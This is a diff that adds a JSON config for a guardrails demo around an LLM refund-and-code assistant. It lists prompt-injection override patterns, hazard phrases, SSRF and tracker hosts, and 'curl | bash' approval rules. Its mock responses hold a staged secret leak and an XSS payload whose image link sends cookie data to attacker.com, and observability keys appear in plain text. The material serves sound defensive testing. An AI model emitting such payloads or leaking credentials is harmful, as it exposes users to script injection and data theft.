@@ -1,0 +1,90 @@
+{
+ "input_rail_file": "predefined_prompts.yaml",
+ "input_rail_sha": "29c61e525279da7c0532414395da2cb60bdc54887f21a247e8ea11d9c6e493c3",
+ "input_rail_yaml": "input_rail:\n  classifier:\n    engine: auto\n    model: protectai/deberta-v3-base-prompt-injection-v2\n    threshold: 0.5\n    enforce: true\n  injection_patterns:\n  - ignore.*instruction\n  - ignore.*rule\n  - bypass.*safety\n  - bypass.*filter\n  - system.*prompt\n  - developer.*mode\n  - dan.*mode\n  - do.*anything.*now\n  - act.*as.*a\n  - forget.*rule\n  - forget.*instruction\n  - override.*safety\n  - jailbreak\n  hazard_patterns:\n  - build a bomb\n  - make a weapon\n  - steal credit cards\n  - hack a server\n  - generate malware\n  - destroy the world\npii:\n  engine: auto\n  language: en\n  score_threshold: 0.5\n  entities:\n  - PERSON\n  - EMAIL_ADDRESS\n  - US_SSN\n  - CREDIT_CARD\n  - PHONE_NUMBER\n  - IP_ADDRESS\n  - IBAN_CODE\n  - US_BANK_NUMBER\n  - CRYPTO\n  operators:\n    DEFAULT:\n      type: replace\n      new_value: '[REDACTED_PII]'\n    PERSON:\n      type: replace\n      new_value: '[REDACTED_NAME]'\n    EMAIL_ADDRESS:\n      type: replace\n      new_value: '[REDACTED_EMAIL]'\n    US_SSN:\n      type: replace\n      new_value: '[REDACTED_SSN]'\n    CREDIT_CARD:\n      type: replace\n      new_value: '[REDACTED_CARD_NUMBER]'\n    PHONE_NUMBER:\n      type: replace\n      new_value: '[REDACTED_PHONE]'\n    IP_ADDRESS:\n      type: replace\n      new_value: '[REDACTED_IP]'\n    IBAN_CODE:\n      type: replace\n      new_value: '[REDACTED_IBAN]'\n    US_BANK_NUMBER:\n      type: replace\n      new_value: '[REDACTED_BANK_ACCOUNT]'\n    CRYPTO:\n      type: replace\n      new_value: '[REDACTED_CRYPTO_WALLET]'\n    API_KEY:\n      type: replace\n      new_value: '[REDACTED_API_KEY]'\npii_patterns:\n  API_KEY:\n    regex: (sk-proj-[a-zA-Z0-9]{20,}|sk-[a-zA-Z0-9]{20,})\n    entity: API_KEY\n    score: 0.9\n    replacement: '[REDACTED_API_KEY]'\n  SSN:\n    regex: \\b\\d{3}-\\d{2}-\\d{4}\\b\n    entity: US_SSN\n    score: 0.85\n    replacement: '[REDACTED_SSN]'\n  CREDIT_CARD:\n    regex: \\b(?:\\d[ -]*?){13,16}\\b\n    entity: CREDIT_CARD\n    score: 0.8\n    replacement: '[REDACTED_CARD_NUMBER]'\n    presidio: false\n  EMAIL:\n    regex: '[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+'\n    entity: EMAIL_ADDRESS\n    score: 0.8\n    replacement: '[REDACTED_EMAIL]'\n    presidio: false\noutput_sanitization:\n  html:\n    engine: nh3\n    allowed_tags:\n    - b\n    - i\n    - em\n    - strong\n    - code\n    - pre\n    - a\n    - p\n    - ul\n    - ol\n    - li\n    - br\n    - span\n    allowed_attributes:\n      a:\n      - href\n      - title\n    url_schemes:\n    - http\n    - https\n    - mailto\n  client:\n    engine: dompurify\n    render_markdown: true\n    allowed_tags:\n    - b\n    - i\n    - em\n    - strong\n    - code\n    - pre\n    - a\n    - p\n    - ul\n    - ol\n    - li\n    - br\n    - span\n    - h1\n    - h2\n    - h3\n    - h4\n    - blockquote\n    - table\n    - thead\n    - tbody\n    - tr\n    - td\n    - th\n    - img\n    - hr\n    - input\n    - del\n    - sup\n    - sub\n    allowed_attributes:\n      a:\n      - href\n      - title\n      - target\n      - rel\n      img:\n      - src\n      - alt\n      - title\n      - width\n      - height\n      span:\n      - class\n      code:\n      - class\n  blocked_link_schemes:\n  - javascript\n  - data\n  - vbscript\n  - file\n  tracker_domains:\n  - attacker.com\n  - evil.com\n  - tracker.com\n  ssrf_hosts:\n  - localhost\n  - 127.0.0.1\n  - internal.corporate.local\n  - 0.0.0.0\n  - 169.254.169.254\n  ssrf_cidr_patterns:\n  - 10\\.\\d+\\.\\d+\\.\\d+\n  - 192\\.168\\.\\d+\\.\\d+\n  - 172\\.(?:1[6-9]|2\\d|3[01])\\.\\d+\\.\\d+\nagency:\n  verification_codes:\n  - '1234'\n  refund_min: 0.0\n  refund_max: 500.0\nsandbox:\n  requires_approval:\n  - curl\\s+.*\\|\\s*(bash|sh)\n  - wget\\s+.*\\|\\s*(bash|sh)\n  - git\\s+push\n  - pip\\s+install\\s+--index\n  - \\beval\\s*\\(\n  - \\bexec\\s*\\(\n  - 169\\.254\\.169\\.254\nobservability:\n  langfuse:\n    enabled: false\n    host: http://localhost:3300\n    public_key: pk-lf-0fc46eed-54ce-4ecc-8d8f-3a5131e546f7\n    secret_key: sk-lf-015631f4-b6fd-41b3-8d88-d2a0f362f2c0\n\n# NVIDIA's own NeMo Guardrails microservices (ContentSafety, TopicControl,\n# JailbreakDetect - https://docs.nvidia.com/nemo/microservices/latest/guardrails/\n# tutorials/content-safety.html). NOT wired up: these only run as NVIDIA NIM\n# containers, which need an NVIDIA GPU (this deployment target has none), or\n# NVIDIA's hosted API catalog (build.nvidia.com), which needs an NVIDIA API\n# key nobody has supplied here. Left as a real, honestly-empty config slot\n# (not a mock) so setting `api_key` and `enabled: true` is the only thing\n# needed to wire it in later - deliberately not faked.\nnemo_native:\n  enabled: false\n  api_key: \"\"\n  content_safety_model: \"nvidia/llama-3.1-nemoguard-8b-content-safety\"\n  topic_control_model: \"nvidia/llama-3.1-nemoguard-8b-topic-control\"\n  jailbreak_detect_model: \"nvidia/nemoguard-jailbreak-detect\"\nmock:\n  triggers:\n    secret:\n    - leak\n    - credential\n    - password\n    - api key\n    - ssn\n    xss:\n    - script\n    - xss\n    - dangerous link\n  responses:\n    secret_leak: Here is the requested information. The system administrator API key is sk-proj-ab12cd34ef56gh78ij90kl. The backup database password is AdminPass123! and the system SSN is 000-12-3456.\n    xss_payload: 'Sure! Click this link to manage your settings: <script>alert(''XSS exploit!'')</script> or check our [Attacker Site](javascript:alert(''Hacked!'')) or track progress here: ![pixel](http://attacker.com/leak_cookie?val=123).'\n    assistant_default: I am a secure LLM assistant. All my inputs and outputs are monitored by NeMo Guardrails. Ask me about refunds, test me with a jailbreak prompt, or ask me to output secrets to see how the guardrails block it!\n    refund_completed: 'Refund processed successfully! Transaction ID: TXN-55418.'\n    refund_cancelled: Refund has been cancelled.\n    refund_ask_confirmation: Account verified. Do you confirm you want to process a refund of 100 USD?\n    refund_ask_verification: To process your refund, I must verify your identity first. Please say 'verify me' or provide your verification code (e.g., 'my verification code is 1234').\n    python_success: 'Python execution successful: $execution_result'\n    python_failed: 'Python execution failed or blocked: $execution_result'\n    fallback: Understood.\n",
+ "pipeline": {
+  "input": [
+   "check jailbreak"
+  ],
+  "output": [
+   "mask sensitive data on output",
+   "sanitize links on output"
+  ],
+  "library": {
+   "input": [
+    {
+     "flow": "check jailbreak",
+     "tool": "check_input_safety",
+     "desc": "Scans the user message: regex injection/hazard patterns from predefined_prompts.yaml, Cedar prompt authorization, and the optional ML injection classifier. Blocks unsafe input."
+    },
+    {
+     "flow": "greeting",
+     "tool": "n/a",
+     "desc": "Detects friendly user welcome greetings and routes them to a safe, secure, formatted introduction message."
+    },
+    {
+     "flow": "refund process",
+     "tool": "refund_payment",
+     "desc": "Coordinates the multi-stage refund flow. Demands step-by-step verification state variables and confirmations before triggering the payment refund API action."
+    },
+    {
+     "flow": "execute python code",
+     "tool": "execute_python_code",
+     "desc": "Triggers python sandbox compiler execution. Evaluates the user code block using static AST checks and dynamic Cedar policies inside an isolated subprocess."
+    },
+    {
+     "flow": "greeting\n  user express greeting\n  bot express greeting",
+     "tool": "n/a",
+     "desc": "Custom flow defined in rails.co"
+    },
+    {
+     "flow": "refund process\n  user request refund\n  \n  if not",
+     "tool": "n/a",
+     "desc": "Custom flow defined in rails.co"
+    },
+    {
+     "flow": "refund cancel\n  user request refund\n  \n  if not",
+     "tool": "n/a",
+     "desc": "Custom flow defined in rails.co"
+    },
+    {
+     "flow": "execute python code\n  user execute python code",
+     "tool": "n/a",
+     "desc": "Custom flow defined in rails.co"
+    }
+   ],
+   "output": [
+    {
+     "flow": "mask sensitive data on output",
+     "tool": "mask_secrets_output",
+     "desc": "Presidio PII engine (spaCy NER + checksum/pattern recognizers). Detects and redacts API keys, SSN, email, credit cards before the reply leaves the backend."
+    },
+    {
+     "flow": "sanitize links on output",
+     "tool": "validate_output",
+     "desc": "nh3 (ammonia) HTML sanitizer + link rules. Strips <script>/unsafe HTML and tracker/SSRF links from the model response."
+    },
+    {
+     "flow": "greeting\n  user express greeting\n  bot express greeting",
+     "tool": "n/a",
+     "desc": "Custom flow defined in rails.co"
+    },
+    {
+     "flow": "refund process\n  user request refund\n  \n  if not",
+     "tool": "n/a",
+     "desc": "Custom flow defined in rails.co"
+    },
+    {
+     "flow": "refund cancel\n  user request refund\n  \n  if not",
+     "tool": "n/a",
+     "desc": "Custom flow defined in rails.co"
+    },
+    {
+     "flow": "execute python code\n  user execute python code",
+     "tool": "n/a",
+     "desc": "Custom flow defined in rails.co"
+    }
+   ]
+  }
+ }
+}
